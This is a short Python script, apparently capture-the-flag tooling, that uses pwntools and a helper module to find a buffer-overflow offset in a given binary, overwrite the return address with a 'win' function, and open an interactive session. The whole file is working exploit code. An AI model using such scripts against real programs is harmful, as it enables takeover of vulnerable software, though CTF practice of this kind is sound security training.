import sys
from pwn import *
from fart import *

# make pwntools shut up!!!
logging.getLogger('pwnlib').setLevel(logging.WARNING)

binary = sys.argv[1]

analyzer = analyze(binary)
b = get2overflow(binary)

buf = b'A'*b.buf()

win = p64(analyzer.get_win())

io = process(binary)
io.sendline(buf + win)

#io.sendline(b'cat flag.txt')
io.interactive()
